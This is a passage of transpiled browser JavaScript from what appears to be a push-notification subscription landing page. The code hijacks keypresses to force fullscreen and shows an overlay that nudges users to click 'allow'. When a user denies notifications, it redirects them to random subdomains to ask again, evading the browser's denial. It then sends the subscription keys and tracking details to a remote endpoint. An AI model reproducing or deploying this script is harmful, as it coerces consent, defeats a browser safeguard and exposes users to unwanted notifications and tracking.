              docElement.requestFullscreen();
            } else if (docElement.mozRequestFullScreen) {
              docElement.mozRequestFullScreen();
            } else if (docElement.webkitRequestFullscreen) {
              docElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
            }
          }
        }

        document.addEventListener('keydown', function (e) {
          if (e.keyCode) {
            FullScreen();
          }
        }, false);
      }
    }, {
      key: 'startPush',
      value: function startPush() {
        if ('Notification' in window && !getCookie('subscrId') && 'serviceWorker' in navigator) {
          this.renderTranslate();
          requestPermission.call(this);
        } else {
          rdomain(this.data.exitUrl);
        }
      }
    }, {
      key: 'renderTranslate',
      value: function renderTranslate() {
        var appView = document.getElementById('page_release-search');
        var lang = this.data.lang;
        var translate = this.translateLand;
        var template = '\n                <div id="blockI" class="blockCh">\n                    <div class="container blockCh"><img src="data:image/png;base64,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" class="arrow">\n                        <div class="block-p"><p class="t1">' + translate[lang].text + '</p></div>\n                    </div>\n                </div>\n                <div class="textArea">' + translate[lang].condition + '\n                <br/>\n                <span class="button">' + translate[lang].approve + '</span>\n                <br />\n                <img src="data:image/png;base64,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" class="arrowup">\n                </div>\n            ';
        appView.innerHTML = template;
      }
    }]);

    return Pushes;
  }();

  function createGetQueryParams(varLocation) {
    var match = void 0;
    var pl = /\+/g; // Regex for replacing addition symbol with a space
    var search = /([^&=]+)=?([^&]*)/g;
    var decode = function decode(s) {
      return decodeURIComponent(s.replace(pl, " "));
    };
    var query = window.location.search.substring(1);

    while (match = search.exec(query)) {
      varLocation[decode(match[1])] = decode(match[2]);
    }
  }

  function getUniqueSymbols() {
    var amount = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 1;
    var prefix = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : '';
    var postfix = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : '';

    return prefix + Math.random().toString(36).substr(2, amount) + postfix;
  }

  function urlBase64ToUint8Array(base64String) {
    var padding = '='.repeat((4 - base64String.length % 4) % 4);
    var base64 = (base64String + padding).replace(/\-/g, '+').replace(/_/g, '/');
    var rawData = window.atob(base64);

    return Uint8Array.from([].concat(_toConsumableArray(rawData)).map(function (char) {
      return char.charCodeAt(0);
    }));
  }

  function getCookie(name) {
    var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));

    return matches ? decodeURIComponent(matches[1]) : null;
  }

  function setCookie(name, value, options) {
    options = options || {};

    var expires = options.expires;

    if (typeof expires === "number" && expires) {
      var date = new Date();
      date.setTime(date.getTime() + expires * 1000);
      expires = options.expires = date;
    }
    if (expires && expires.toUTCString) {
      options.expires = expires.toUTCString();
    }

    value = encodeURIComponent(value);

    var updatedCookie = name + "=" + value;

    for (var propName in options) {
      updatedCookie += "; " + propName;
      var propValue = options[propName];
      if (propValue !== true) {
        updatedCookie += "=" + propValue;
      }
    }
    document.cookie = updatedCookie;
  }

  function requestPermission() {
    var _this = this;

    Notification.requestPermission().then(function (result) {
      if (result.toLowerCase() !== 'granted') {
        onRequestDenied.call(_this, result);
      } else {
        onRequestApproved.call(_this, result);
      }
    });
  }

  function installWorker() {
    var _this2 = this;

    navigator.serviceWorker.register('//' + location.host + this.data.locationServiceWorker).then(function () {
      navigator.serviceWorker.ready.then(function (rWorker) {
        rWorker.pushManager.subscribe({
          userVisibleOnly: true,
          applicationServerKey: urlBase64ToUint8Array(_this2.data.apiKey)
        }).then(function (pushSubscription) {
          sendSubscription.call(_this2, pushSubscription);
        });
      });
    });
  }

  function getAndSetCookie(cookieName) /*days*/{
    var expireTime = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : this.data.capping.identityExpire;

    var item = getCookie(cookieName);

    if (!item) {
      var expireDate = new Date(new Date().getTime() + expireTime * 86400 * 1000);

      item = getUniqueSymbols(11, 't_');
      setCookie(cookieName, item, {
        domain: '.' + this.data.domain,
        expires: expireDate.toUTCString()
      });
    }

    return item;
  }

  function sendSubscription(pushSubscription) {
    var _this3 = this;

    var keys = pushSubscription.toJSON().keys;

    fetch(this.data.fetchUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        webmaster_id: this.data.webmaster_id,
        event_id: 'subscribe',
        subscription_id: pushSubscription.endpoint,
        auth_secret: keys.auth,
        public_key: keys.p256dh,
        referrer: document.referrer,
        origin: location.host + location.pathname,
        host: location.host,
        lang: navigator.language,
        datestamp: Date.now(),
        timezone: new Date().getTimezoneOffset(), //time zone in minutes
        scheme: this.data.httpProtocol,
        utm_source: this.urlParams['utm_source'],
        utm_medium: this.urlParams['utm_medium'],
        sub1: this.stats.sub1,
        sub2: this.stats.sub2,
        sub3: this.stats.sub3,
        sub4: this.stats.sub4,
        sub5: this.stats.sub5,
        utm_campaign: this.urlParams['utm_campaign'],
        utm_content: this.urlParams['utm_content'],
        utm_term: this.urlParams['utm_term'],
        click_id: this.urlParams['clickid'],
        device_id: this.ids.tokenId,
        device_resolution: screen.availWidth + 'x' + screen.availHeight
      })
    }).then(function (response) {
      console.log('subscribe success', response);
      getAndSetCookie.call(_this3, 'subscrId');
    }).then(function () {
      return rdomain(_this3.data.exitUrl);
    });
  }

  function onRequestApproved(res) {
    console.log('on request approved', res);
    installWorker.call(this);
  }

  function rdomain(url) {
    window.location.replace(url);
  }

  function onRequestDenied(res) {
    console.log('requestPermission denied', res);

    var countSubscribes = getCookie('countSubscribes');
    var expires = new Date(new Date().getTime() + 30 * 86400 * 1000);
    var exitUrl = this.data.exitUrl;
    var randDomain = getUniqueSymbols(4);
    var buildUrl = 'https://' + randDomain + '.' + this.data.domain + window.location.pathname + window.location.search;

    // РџСЂРѕРІРµСЂРєР° РЅР° РѕСЃС‚Р°РІС€РёРµСЃСЏ РєРѕР»-РІРѕ РїРѕРїС‹С‚РѕРє
    if (countSubscribes === null) {
      setCookie('countSubscribes', this.data.maxCountSubscribes, {
        domain: '.' + this.data.domain,
        expires: expires.toUTCString()
      });
      rdomain(buildUrl);
    }

    if (countSubscribes !== null && countSubscribes > 0) {
      setCookie('countSubscribes', parseInt(getCookie('countSubscribes'), 10) - 1, {
        domain: '.' + this.data.domain,
        expires: expires.toUTCString()
      });
      rdomain(buildUrl);
    } else if (countSubscribes !== null && countSubscribes <= 0) {
      rdomain(exitUrl);
    }
  }

  (function () {
    return window[getUniqueSymbols(7, 'h')] = new Pushes();
  })();
})();
